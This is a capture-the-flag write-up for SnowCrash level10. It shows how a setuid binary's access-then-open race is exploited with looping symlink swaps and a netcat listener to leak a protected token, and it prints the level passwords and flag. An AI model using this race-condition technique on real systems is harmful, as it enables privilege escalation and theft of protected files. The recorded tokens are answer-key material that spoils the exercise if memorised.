`su level10 -> s5cAJpM8ev6XHw998pRWG728z`

We have a binary owned by flag10 and a token impossible to read:

```bash
level10@SnowCrash:~$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Try to run the binary:

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it
```

Try something without port information:

```bash
level10@SnowCrash:~$ ./level10 token  0.0.0.0
You don't have access to token
```

Try with a file with good permissions:

```bash
level10@SnowCrash:~$ echo 42 > /tmp/42
level10@SnowCrash:~$ ./level10 /tmp/42  0.0.0.0
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```

Now we know the port is `6969`. We can try to send the file to netcat server.
To do this we need to run netcat server in a terminal and send the file in another terminal.

- send the file:

```bash
level10@SnowCrash:~$ ./level10 /tmp/42  0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!
```

- netcat server:

```bash
level10@SnowCrash:~$ nc -l 6969
.*( )*.
42
```

It's working but not with the token. Check what it's doing with ltrace with `/tmp/42`:

```bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/42  0.0.0.0
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>)
access("/tmp/42", 4)
printf("Connecting to %s:6969 .. ", "0.0.0.0")
fflush(0xb7fd1a20Connecting to 0.0.0.0:6969 .. )
socket(2, 1, 0)
inet_addr("0.0.0.0")
htons(6969, 1, 0, 0, 0)
connect(3, 0xbffff71c, 16, 0, 0)
write(3, ".*(
printf("Connected!\nSending file .. "Connected!)
)
fflush(0xb7fd1a20Sending file .. )
open("/tmp/42", 0, 010)
read(4, "42\n", 4096)
write(3, "42\n", 3)
puts("wrote file!"wrote file!
)
+++ exited (status 12)
```

The binary check first if our user can read the file and then open it and write in the socket.
We can exploit a **race condition** because the socket thinks are executed after the access and it take long time.
To do this we need to:

1- Listen with netcat

```bash
level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v ".*( )*."; done
```

-2 Create a file where we can access / delete it / create a symlink between the file and token:

```bash
level10@SnowCrash:~$ while true; do touch /tmp/42; rm -rf /tmp/42; ln -s $PWD/token /tmp/42; rm -rf /tmp/42; done
```

3- Send `/tmp/42` to the server a lots of times:

```bash
level10@SnowCrash:~$ while true ; do ./level10 /tmp/42 0.0.0.0 2> /dev/null; done
```

Then we get the token mulitple times:

```bash
level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v ".*( )*."; done
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
```

Connect with this:

```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
